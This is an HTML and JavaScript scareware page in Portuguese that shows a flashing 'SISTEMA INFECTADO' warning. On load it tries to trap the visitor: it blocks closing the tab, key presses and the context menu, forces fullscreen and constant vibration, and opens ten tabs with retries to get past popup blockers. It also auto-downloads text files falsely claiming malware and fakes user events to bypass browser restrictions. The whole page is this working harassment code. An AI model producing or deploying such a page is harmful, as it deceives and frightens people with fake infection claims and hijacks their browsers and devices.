<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>SISTEMA INFECTADO</title>
    <style>
        body {
            margin: 0;
            overflow: hidden;
            background: black;
            color: red;
            font-family: monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            user-select: none;
            touch-action: none;
        }
        #message {
            font-size: 8vw;
            text-align: center;
            animation: blink 0.3s infinite, colorChange 2s infinite, shadowPulse 1s infinite;
            text-shadow: 0 0 3vw red;
            z-index: 10;
            padding: 2vw;
        }
        #counter {
            font-size: 4vw;
            color: #ff4040;
            position: fixed;
            top: 10vw;
            z-index: 10;
        }
        @keyframes blink {
            50% { opacity: 0; }
        }
        @keyframes colorChange {
            0% { color: red; }
            50% { color: #ff4040; }
            100% { color: red; }
        }
        @keyframes shadowPulse {
            0% { text-shadow: 0 0 3vw red; }
            50% { text-shadow: 0 0 5vw red; }
            100% { text-shadow: 0 0 3vw red; }
        }
        canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
        }
    </style>
</head>
<body>
    <div id="message">SISTEMA INFECTADO! ARQUIVOS SENDO INSTALADOS!</div>
    <div id="counter">Arquivos baixados: 0/5</div>
    <canvas id="glitch"></canvas>
    <script>
        // Impedir fechamento da aba
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = 'SISTEMA COMPROMETIDO! SAIR PODE CAUSAR DANOS!';
        });

        // Bloquear interações
        document.addEventListener('keydown', (e) => e.preventDefault());
        document.addEventListener('contextmenu', (e) => e.preventDefault());
        document.addEventListener('touchmove', (e) => e.preventDefault(), { passive: false });

        // Tentar manter o foco na janela
        window.addEventListener('blur', () => {
            window.focus();
        });

        // Tentar tela cheia
        function requestFullscreen() {
            const elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen().catch(() => {});
            } else if (elem.webkitRequestFullscreen) {
                elem.webkitRequestFullscreen().catch(() => {});
            } else if (elem.mozRequestFullScreen) {
                elem.mozRequestFullScreen().catch(() => {});
            } else if (elem.msRequestFullscreen) {
                elem.msRequestFullscreen().catch(() => {});
            }
        }

        // Vibração em dispositivos móveis
        function startVibration() {
            if (navigator.vibrate) {
                setInterval(() => {
                    navigator.vibrate([50, 50, 50]);
                }, 600);
            }
        }

        // Efeito de fundo (glitch)
        const canvas = document.getElementById('glitch');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const ctx = canvas.getContext('2d');
        function glitchEffect() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            for (let i = 0; i < 50; i++) {
                ctx.fillStyle = `hsl(${Math.random() * 360}, 100%, 50%)`;
                ctx.fillRect(
                    Math.random() * canvas.width,
                    Math.random() * canvas.height,
                    Math.random() * 40,
                    Math.random() * 40
                );
            }
            requestAnimationFrame(glitchEffect);
        }
        glitchEffect();

        // Conteúdo personalizável dos arquivos .txt
        const txtContents = [
            "ERRO CRÍTICO: Seu dispositivo foi comprometido! Não desligue o sistema.",
            "AVISO: Arquivos de sistema estão sendo modificados. Qualquer ação pode piorar a situação.",
            "ALERTA: Dados sensíveis estão sendo expostos. Contate o suporte imediatamente.",
            "FALHA: Sistema operacional corrompido. Reinicie em modo de segurança.",
            "PERIGO: Malware detectado. Todos os arquivos estão em risco."
        ];

        // Função para criar e baixar arquivos .txt
        let downloadCount = 0;
        function downloadTxtFiles() {
            txtContents.forEach((content, index) => {
                const delay = 500 * index + Math.random() * 300 - 150; // Atraso base de 500ms ±150ms
                setTimeout(() => {
                    try {
                        const blob = new Blob([content], { type: 'text/plain' });
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = `aviso_critico_${index + 1}.txt`;
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);
                        URL.revokeObjectURL(url);
                        downloadCount++;
                        document.getElementById('counter').textContent = `Arquivos baixados: ${downloadCount}/5`;
                    } catch (e) {
                        console.error('Erro ao baixar arquivo:', e);
                    }
                }, delay);
            });
        }

        // Função para abrir 10 sites diferentes
        function openTabs() {
            const urls = [
                'https://www.google.com',
                'https://www.youtube.com',
                'https://www.wikipedia.org',
                'https://www.amazon.com',
                'https://www.reddit.com',
                'https://www.twitter.com',
                'https://www.instagram.com',
                'https://www.linkedin.com',
                'https://www.netflix.com',
                'https://www.github.com'
            ];
            urls.forEach((url, index) => {
                const delay = 1000 * index + Math.random() * 500 - 250; // Atraso base de 1000ms ±250ms
                setTimeout(() => {
                    try {
                        const newWindow = window.open(url, '_blank');
                        if (!newWindow) {
                            setTimeout(() => window.open(url, '_blank'), 3000);
                            setTimeout(() => window.open(url, '_blank'), 6000);
                        }
                    } catch (e) {
                        console.error('Erro ao abrir guia:', e);
                    }
                }, delay);
            });
        }

        // Iniciar ações
        let hasStarted = false;
        function startInfection() {
            if (hasStarted) return;
            hasStarted = true;
            downloadTxtFiles();
            openTabs();
            requestFullscreen();
            startVibration();
            // Retentar downloads após 4s e 8s
            setTimeout(downloadTxtFiles, 4000);
            setTimeout(downloadTxtFiles, 8000);
        }

        // Simular interação para contornar restrições
        function simulateInteraction() {
            try {
                const events = [
                    new Event('click', { bubbles: true }),
                    new Event('touchstart', { bubbles: true }),
                    new Event('mousedown', { bubbles: true })
                ];
                events.forEach(event => document.dispatchEvent(event));
            } catch (e) {
                console.error('Erro ao simular interação:', e);
            }
        }

        // Gatilhos para iniciar
        document.addEventListener('click', startInfection, { once: true });
        document.addEventListener('touchstart', startInfection, { once: true });

        // Aguardar carregamento completo
        window.addEventListener('load', () => {
            simulateInteraction();
            setTimeout(startInfection, 500);
        });
    </script>
</body>
</html>
